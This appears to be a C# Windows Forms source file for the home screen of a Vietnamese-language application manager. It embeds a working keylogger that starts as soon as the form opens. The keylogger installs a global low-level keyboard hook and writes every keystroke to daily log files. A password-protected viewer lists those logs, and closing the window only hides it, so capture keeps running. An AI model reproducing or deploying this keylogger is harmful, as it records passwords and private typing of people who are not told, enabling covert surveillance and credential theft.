using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace BTLNET
{
    public partial class TrangChu : Form, ILanguageChangeable
    {
        private QuanLiUD installedForm;
        private UDDaDung historyForm;
        private CaiDat settingsForm;

        // Thêm các biến keylogger
        private Thread keyloggerThread;
        private string logFilePath = $"Logfile/LogKey/logKey{DateTime.Now.Day}-{DateTime.Now.Month}-{DateTime.Now.Year}.txt";
        private volatile bool isKeyloggerRunning = false;
        private LowLevelKeyboardProc _proc;
        private IntPtr _hookID = IntPtr.Zero;

        // Import DLL methods
        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(Keys vKey);

        private const int WH_KEYBOARD_LL = 13;
        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        public TrangChu()
        {
            InitializeComponent();
            LanguageChange.LanguageChanged += (s, lang) => ApplyLanguage(lang);
            ApplyLanguage(LanguageChange.CurrentLanguage);
            StartKeylogger();
        }



        public void ApplyLanguage(string language)
        {
            button1.Text = " " + LanguageChange.GetTranslation("InstalledApps");
            button2.Text = "📋 " + LanguageChange.GetTranslation("AppHistory");
            button3.Text = "⌨️ " + LanguageChange.GetTranslation("KeyboardHistory");
            button4.Text = "⚙️ " + LanguageChange.GetTranslation("Settings");
            this.Name = LanguageChange.GetTranslation("Home");
            this.Text = LanguageChange.GetTranslation("Home");
            lblTitle.Text = LanguageChange.GetTranslation("ApplicationManager").ToUpper();

          
        }


        private void StartKeylogger()
        {
            if (!isKeyloggerRunning)
            {
                isKeyloggerRunning = true;
                _proc = HookCallback;
                _hookID = SetHook(_proc);
                keyloggerThread = new Thread(KeyloggerLoop);
                keyloggerThread.Start();
            }
        }

        private void StopKeylogger()
        {
            if (isKeyloggerRunning)
            {
                isKeyloggerRunning = false;

                if (_hookID != IntPtr.Zero)
                {
                    UnhookWindowsHookEx(_hookID);
                    _hookID = IntPtr.Zero;
                }

                if (keyloggerThread != null && keyloggerThread.IsAlive)
                {
                    keyloggerThread.Abort();
                    keyloggerThread = null;
                }
            }
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private void KeyloggerLoop()
        {
            while (isKeyloggerRunning)
            {
                Application.DoEvents();
                Thread.Sleep(100);
            }
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (vkCode != 231)
                {
                    bool shiftPressed = (GetAsyncKeyState(Keys.ShiftKey) & 0x8000) != 0;
                    bool capsLock = Control.IsKeyLocked(Keys.CapsLock);

                    string keyChar = GetCharFromKey((Keys)vkCode, shiftPressed, capsLock);
                    LogKey(keyChar);
                }
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private string GetCharFromKey(Keys key, bool shift, bool capsLock)
        {
            switch (key)
            {
                case Keys.Space: return " ";
                case Keys.Enter: return "\r\n";
                case Keys.Tab: return "\t";
                case Keys.Back: return "[Backspace]";
                case Keys.LShiftKey:
                case Keys.RShiftKey:
                case Keys.LControlKey:
                case Keys.RControlKey:
                case Keys.LMenu:
                case Keys.RMenu:
                case Keys.Capital:
                    return "";
            }

            char c = (char)key;

            if (char.IsLetter(c))
            {
                bool uppercase = (shift && !capsLock) || (!shift && capsLock);
                return uppercase ? c.ToString().ToUpper() : c.ToString().ToLower();
            }

            if (shift)
            {
                switch (key)
                {
                    case Keys.D1: return "!";
                    case Keys.D2: return "@";
                    case Keys.D3: return "#";
                    case Keys.D4: return "$";
                    case Keys.D5: return "%";
                    case Keys.D6: return "^";
                    case Keys.D7: return "&";
                    case Keys.D8: return "*";
                    case Keys.D9: return "(";
                    case Keys.D0: return ")";
                }
            }

            return c.ToString();
        }

        private void LogKey(string keyChar)
        {
            try
            {
                if (!string.IsNullOrEmpty(keyChar))
                {
                    string directory = Path.GetDirectoryName(logFilePath);
                    if (!Directory.Exists(directory))
                    {
                        Directory.CreateDirectory(directory);
                    }
                    File.AppendAllText(logFilePath, keyChar);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("Lỗi ghi log: " + ex.Message);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            // Kiểm tra nếu form đã tồn tại và đã bị đóng
            if (installedForm == null || installedForm.IsDisposed)
            {
                installedForm = new QuanLiUD();
            }

            // Hiển thị form lịch sử
            if (!installedForm.Visible)
            {
                installedForm.Show();
            }
            else
            {
                installedForm.BringToFront();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            // Kiểm tra nếu form đã tồn tại và đã bị đóng
            if (historyForm == null || historyForm.IsDisposed)
            {
                historyForm = new UDDaDung();
            }

            // Hiển thị form lịch sử
            if (!historyForm.Visible)
            {
                historyForm.Show();
            }
            else
            {
                historyForm.BringToFront();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            Form passwordForm = new Form
            {
                Text = LanguageChange.GetTranslation("Confirm"),
                Size = new Size(300, 150),
                StartPosition = FormStartPosition.CenterParent,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false
            };

            TextBox txtPassword = new TextBox
            {
                Location = new Point(20, 40),
                Size = new Size(240, 25),
                PasswordChar = '•',
                Font = new Font("Segoe UI", 10)
            };

            Button btnSubmit = new Button
            {
                Text = LanguageChange.GetTranslation("Confirm"),
                Location = new Point(100, 70),
                Size = new Size(80, 30),
                BackColor = Color.FromArgb(0, 120, 215),
                ForeColor = Color.White,
                FlatStyle = FlatStyle.Flat
            };

            Label lblPrompt = new Label
            {
                Text = LanguageChange.GetTranslation("EnterPass") ,
                Location = new Point(20, 15),
                Size = new Size(200, 20),
                Font = new Font("Segoe UI", 10)
            };

            btnSubmit.Click += (s, ev) =>
            {
                // Thay đổi mật khẩu tại đây
                if (txtPassword.Text == Properties.Settings.Default.KeyloggerPassword)
                {
                    passwordForm.DialogResult = DialogResult.OK;
                    passwordForm.Close();
                }
                else
                {
                    MessageBox.Show("Mật khẩu không đúng!", "Lỗi",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                    txtPassword.Clear();
                    txtPassword.Focus();
                }
            };

            // Cho phép nhấn Enter để submit
            txtPassword.KeyPress += (s, ev) =>
            {
                if (ev.KeyChar == (char)Keys.Enter)
                {
                    ev.Handled = true;
                    btnSubmit.PerformClick();
                }
            };

            passwordForm.Controls.AddRange(new Control[] { txtPassword, btnSubmit, lblPrompt });

            // Chỉ hiển thị logs nếu nhập đúng mật khẩu
            if (passwordForm.ShowDialog() == DialogResult.OK)
            {
                try
                {
                    string logDirectory = Path.GetDirectoryName(logFilePath);

                    if (!Directory.Exists(logDirectory))
                    {
                        Directory.CreateDirectory(logDirectory);
                        MessageBox.Show("Chưa có file log nào được tạo.", "Thông báo",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return;
                    }

                    var logFiles = Directory.GetFiles(logDirectory, "logKey*.txt")
                                          .OrderByDescending(f => File.GetLastWriteTime(f))
                                          .ToList();

                    if (logFiles.Count == 0)
                    {
                        MessageBox.Show("Chưa có file log nào được tạo.", "Thông báo",
                            MessageBoxButtons.OK, MessageBoxIcon.Information);
                        return;
                    }

                    Form FormChinh = new Form
                    {
                        Text = LanguageChange.GetTranslation("LogFileList"),
                        Size = new Size(600, 400),
                        StartPosition = FormStartPosition.CenterParent
                    };

                    ListView listView = new ListView
                    {
                        Dock = DockStyle.Fill,
                        View = View.Details,
                        FullRowSelect = true,
                        GridLines = true
                    };

                    listView.Columns.Add(LanguageChange.GetTranslation("AppName"), 200);
                    listView.Columns.Add(LanguageChange.GetTranslation("DiskSpace"), 100);
                    listView.Columns.Add(LanguageChange.GetTranslation("CreatDate"), 150);
                    listView.Columns.Add(LanguageChange.GetTranslation("LastModified"), 150);

                    foreach (string file in logFiles)
                    {
                        FileInfo fileInfo = new FileInfo(file);
                        ListViewItem item = new ListViewItem(fileInfo.Name);
                        item.SubItems.Add($"{fileInfo.Length / 1024.0:F2} KB");
                        item.SubItems.Add(fileInfo.CreationTime.ToString("dd/MM/yyyy HH:mm"));
                        item.SubItems.Add(fileInfo.LastWriteTime.ToString("dd/MM/yyyy HH:mm"));
                        item.Tag = file;
                        listView.Items.Add(item);
                    }

                    listView.DoubleClick += (s, ev) =>
                    {
                        if (listView.SelectedItems.Count > 0)
                        {
                            string filePath = listView.SelectedItems[0].Tag.ToString();
                            try
                            {
                                Process.Start("notepad.exe", filePath);
                            }
                            catch (Exception ex)
                            {
                                MessageBox.Show($"Không thể mở file: {ex.Message}", "Lỗi",
                                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    };

                    FormChinh.Controls.Add(listView);
                    FormChinh.ShowDialog();
                }
                catch (Exception ex)
                {
                    MessageBox.Show($"Lỗi khi hiển thị log files: {ex.Message}", "Lỗi",
                        MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            }

        }

        private void button4_Click(object sender, EventArgs e)
        {
            if (settingsForm == null || settingsForm.IsDisposed)
            {
                settingsForm = new CaiDat();

            }

            settingsForm.ShowDialog();
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
                this.Hide();
            }
            else
            {
                StopKeylogger();
                if (trayIcon != null)
                {
                    trayIcon.Dispose();
                }
            }
        }

        private void OnTrayIconExit(object sender, EventArgs e)
        {
            StopKeylogger();
            if (trayIcon != null)
            {
                trayIcon.Visible = false;
                trayIcon.Dispose();
            }
            Application.Exit();
        }
    }
}
